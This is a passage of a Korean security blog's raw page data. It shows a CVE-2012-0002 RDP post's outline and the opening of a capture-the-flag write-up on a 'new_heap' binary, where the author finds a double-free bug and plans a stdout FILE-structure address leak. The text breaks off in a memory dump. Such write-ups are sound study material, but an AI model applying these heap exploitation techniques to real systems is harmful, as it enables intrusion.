href=\"#%EA%B3%B5%EA%B2%A9\">공격</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B0%B0%EA%B2%BD\">취약점 분석 배경</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9A%94%EC%95%BD\">CVE-2012-0002 취약점 요약</a></p>\n</li>\n<li>\n<p><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\">BSOD 메모리 덤프 환경 설정</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%9C%EC%9A%94\">CVE-2012-0002 취약점 개요</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EB%8C%80%EC%83%81-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%AA%A9%EB%A1%9D\">CVE-2012-0002 대상 시스템 목록</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9B%90%EB%A6%AC\">CVE-2012-0002 취약점 원리</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B0%8F-%EA%B8%B0%EB%B3%B8-%EA%B0%9C%EB%85%90\">공격 기법 및 기본 개념</a></p>\n<ul>\n<li><a href=\"#uaf-use-after-free\">UAF (Use-After-Free)</a></li>\n<li><a href=\"#rdp-remote-desktop-protocol\">RDP (Remote Desktop Protocol)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rdp-%EB%93%9C%EB%9D%BC%EC%9D%B4%EB%B2%84-%ED%8C%A8%EC%B9%98-%EC%A0%84-%ED%9B%84-%EC%BD%94%EB%93%9C-%EB%B9%84%EA%B5%90\">RDP 드라이버 패치 전 후 코드 비교</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C\">공격 코드</a></p>\n<ul>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">공격 코드 분석</a></li>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89\">공격 코드 실행</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B6%84%EC%84%9D\">공격 기법 분석</a></p>\n<ul>\n<li><a href=\"#wireshark-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\">Wireshark 동적 분석</a></li>\n<li><a href=\"#windbg-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\">Windbg 동적 분석</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%B3%B4%EC%95%88-%EC%97%85%EB%8D%B0%EC%9D%B4%ED%8A%B8-%EC%84%A4%EC%B9%98\">보안 업데이트 설치</a></p>\n</li>\n<li>\n<p><a href=\"#reference\">Reference</a></p>\n</li>\n</ul>\n</div>","excerpt":"취약점 분석 보고서 CVE-2012-0002  Metasploit 취약성 테스트 Nessus DB 정보 내보내기 Metasploit Exploit Framework를 통해 대상 서비스 취약성 점검을 하기 위해\nNessus를 바탕으로 점검한 결과를 DB 형태로 내보내기를 진행 파일은 xml\n유형의 Nessus 확장자 구성으로 되어있으며 해당 파일일 작업 공간에 저장\n한다.  Metasploit workspace Metasploit 상에 취약점 점검 대상의 정보를 관리하기 위해 Nessus DB정보를\n받아와 작업할 공간을 만든다.  Metasploit DB 연결 상태 확인 및 가져오기 데이터베이스 상태를 확인한 후 만약 실패로 나온다면 PostgreSQL 서비스를\n키도록 한다. db_import 명령을 통해 다운 받은 Nessus DB 결과 정보를\n불러온다.  점검 대상 서비스 정보 확인 services 명령을 통해 서비스 정보를 확인한 결과 점검 대상인 msrdp/3389\n서비스가 …","frontmatter":{"date":"December 07, 2020","title":"CVE-2012-0002 1-day 취약점 분석","categories":"windows 1-day","author":"Zer0Luck","emoji":"🥤"},"fields":{"slug":"/cve_2012_0002_1-day/"}},"next":{"id":"81c9b852-12d0-5052-be3b-9d9f1ddd6ccf","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">new_heap<span class=\"token punctuation\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB shared <span class=\"token builtin\">object</span>\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span> version <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>\ndynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span>\n<span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">2.6</span><span class=\"token number\">.32</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>d8a6eae195909da34581c15b13d84d41ebeeab2e\nstripped\n\nlinux<span class=\"token operator\">-</span>vdso<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff7ffb000</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>x86_64<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token operator\">/</span>libc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff77e1000</span><span class=\"token punctuation\">)</span>\n\t\t\t\t\t   <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff7dd5000</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"보호-기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95\" aria-label=\"보호 기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호 기법</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> <span class=\"token string\">'/home/Zer0Luck/challenges/new_heap/new_heap'</span>\n    Arch<span class=\"token punctuation\">:</span>     amd64<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token operator\">-</span>little\n    RELRO<span class=\"token punctuation\">:</span>    Full RELRO\n    Stack<span class=\"token punctuation\">:</span>    Canary found\n    NX<span class=\"token punctuation\">:</span>       NX enabled\n    PIE<span class=\"token punctuation\">:</span>      PIE enabled</code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 655px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/klEQVQoz52RzW7DIBCE/f6vWEWV2kiO7GBsWGDZPyLiNsrBh7qjEZdl9DHs4CMnYCxNuB3JWlN7ujVTE1bqFjKT4Xus1ys5V9XMrNnr7LGWKN+zm2Ca05y5xApzml12S16A0uBWnGcg4n7/pIZc1S8yju124xhVRN/HVeqK64Zblfpbw3b3MIqtK10uZRxp24RInz1/REpAABVI6YhMndyxgU8/O2aOgSpzqbi3RsQ/9h+QzS/68Rm/xi3GCkBE8hoj45IXX7wv/iCcUBLQNFFOwqzC+o5VU1befRAOmd0dQxBIUgqd6wxFElgILSU9u+r+Ye2/Ggp32r74s+EHeXv/T7g5FacAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png\"\n        srcset=\"/static/7d27dc209a6ccc4d097443af38f803ca/e9ff0/0.png 180w,\n/static/7d27dc209a6ccc4d097443af38f803ca/f21e7/0.png 360w,\n/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png 655w\"\n        sizes=\"(max-width: 655px) 100vw, 655px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">print_menu</code> 함수를 바탕으로 1.alloc, 2. free, 3. exit 조건을 수행하는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"alloc\" style=\"position:relative;\"><a href=\"#alloc\" aria-label=\"alloc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>alloc</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABP0lEQVQoz42S227bMAyG/f6vuC7DsnR2oliRRNEUT9LQLKi7dYcSgm6ID/8BnOaQASriViuWAiI63k0f/f0bY0znFU+ntCwtBAlBYhzb9rL8yEyXG+XUYqQCPaWRs9XaW3vQ5lalZs6lFRQEBhCoUqtUUpquiWkTbhZXBRhEymzuD1hdq9TCpXAhJeAX8udfpU7IHq9+XmGFND7mdrdN6jn1SyAx7vesbwM/6un9j51N4WYlOzAUbKrD/K/qryXvyt8v/vTJT3M7PbfjUUuRX4De1VW7enfv/rvtcOOUDHFsqOvKqsN9d87GM8xzneMWM2dkNLcdLls/fB6HIzzH6+Er5mQAwixm7jbk3nZqCQVRMFJU369oyujLbMsiT1/4W7gUQCJqjVozIu//PJfpHAkrNxoi/Z7xPz25u+pD/AcLC76IaaFjPgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png\"\n        srcset=\"/static/1065ae685e1e928c28f52c7e47c62a3f/e9ff0/1.png 180w,\n/static/1065ae685e1e928c28f52c7e47c62a3f/f21e7/1.png 360w,\n/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png 642w\"\n        sizes=\"(max-width: 642px) 100vw, 642px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>메모리 동적할당 과정을 확인해 보면 전역 포인터 배열 <code class=\"language-text\">heap_ptr</code> 에 할당하는 것을 확인할 수 있으며 인덱스 범위가 총19개까지 할당이 가능하다.</li>\n<li>사용자의 입력값이 <code class=\"language-text\">0x78</code> 이하까지 size로 할당이 되어지며 해당 사이즈 만큼 데이터를 입력 할 수 있다.</li>\n</ul>\n<h2 id=\"free\" style=\"position:relative;\"><a href=\"#free\" aria-label=\"free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>free</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 620px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAzUlEQVQY051OQW7DMAzz/1+yP63Y2qYN1qRObNlSZNmWh7ko0AE7BCN4IESRoLnMbytcFy/Eip2BCqX8SkyCSbr4dTdrOHj3AVQCkSTNuUlqO2GmpUy39nkOx0ucJym5vtra1JJ9t4fBDZAgCsYUUUib/oQtMPjiAt09ANISfNiwWz2sSkKevWO35Q0YHLuYomoPR67jVcd54UqlZswRKKjum/11l9NxG05tvOG8Bq1/PGnTx86H0OcwYyExZ8QWmZCpVm27YTDVXvkffAOVlNRmwmJTZQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png\"\n        srcset=\"/static/1869ca93d30719e9422c46ece04e30c4/e9ff0/2.png 180w,\n/static/1869ca93d30719e9422c46ece04e30c4/f21e7/2.png 360w,\n/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png 620w\"\n        sizes=\"(max-width: 620px) 100vw, 620px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>free되는 과정을 확인해 보면 사용자의 입력 값이 곧 인덱스 범위로 사용되어 원하는 힙을 해제할 수 있으며 기본적인 길이 검증이 존재한다.</li>\n<li>하지만 해제한 초인터를 초기화하지 않기 때문에 Double Free Bug가 발생한다.</li>\n</ul>\n<h2 id=\"memory-leak-idea\" style=\"position:relative;\"><a href=\"#memory-leak-idea\" aria-label=\"memory leak idea permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>memory leak Idea</h2>\n<ul>\n<li>어떻게 하면 메모리 주소값을 릭할 수 있을 까?</li>\n<li>힙 청크의 데이터를 출력하는 기능이 존재하지 않아 다른 방법을 찾아야 한다.</li>\n</ul>\n<h2 id=\"_io_file_stdout\" style=\"position:relative;\"><a href=\"#_io_file_stdout\" aria-label=\"_io_file_stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>_IO_FILE_stdout</h2>\n<ul>\n<li><code class=\"language-text\">stdout</code> 파일 디스크립터는 출력할 때 주로 사용하며 구조체로 수많은 멤버 변수가 정의되어 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">int</span> _flags<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* High-order word -> _IO_MAGIC, 나머지는 플래그 */</span>\n  <span class=\"token comment\">/* 다음 포인터는 C++ streambuf 프로토콜에 해당한다. */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 읽기 버퍼에 대한 포인터*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 읽기 버퍼 주소의 끝을 가리키는 포인터*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of putback+get area.,\n 파일 읽기 버퍼 주소의 시작을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 쓰기 버퍼의 주소의 시작을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 쓰기 버퍼에 대한 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 쓰기 버퍼 주소의 끝을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_buf_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of reserve area. 준비 구역의 시작 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_buf_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 준비 구역의 끝 */</span>\n  <span class=\"token comment\">/* 다음 필드는 백업 및 실행 취소를 지원하는데 사용된다.*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_base<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to start of non-current get area. */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_backup_base<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Pointer to first valid character of backup area */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_end<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to end of non-current get area. */</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_marker</span> <span class=\"token operator\">*</span>_markers<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token operator\">*</span>_chain<span class=\"token punctuation\">;</span> \n  <span class=\"token keyword\">int</span> _fileno<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">int</span> _flags2<span class=\"token punctuation\">;</span>\n  __off_t _old_offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* This used to be _offset but it's too small.  */</span>\n  <span class=\"token comment\">/* 1+column number of pbase(); 0 is unknown. */</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> _cur_column<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">char</span> _vtable_offset<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">char</span> _shortbuf<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span>_IO_lock_t <span class=\"token operator\">*</span>_lock<span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_IO_USE_OLD_IO_FILE</span></span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"stdout\" style=\"position:relative;\"><a href=\"#stdout\" aria-label=\"stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>stdout</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0x7ffff7dd0760</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">></span><span class=\"token operator\">:</span>       <span class=\"token number\">0x00000000fbad2887</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0770</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0780</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0790</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd07a0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">64</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e4</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd07b0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">80</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd07c0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">96</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00007ffff7dcfa00</span>\n<span class=\"token number\">0x7ffff7dd07d0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">112</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000001</span>      <span class=\"token number\">0xffffffffffffffff</span>\n<span class=\"token number\">0x7ffff7dd07e0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">128</span><span class=\"token operator\">></span><span class=\"token 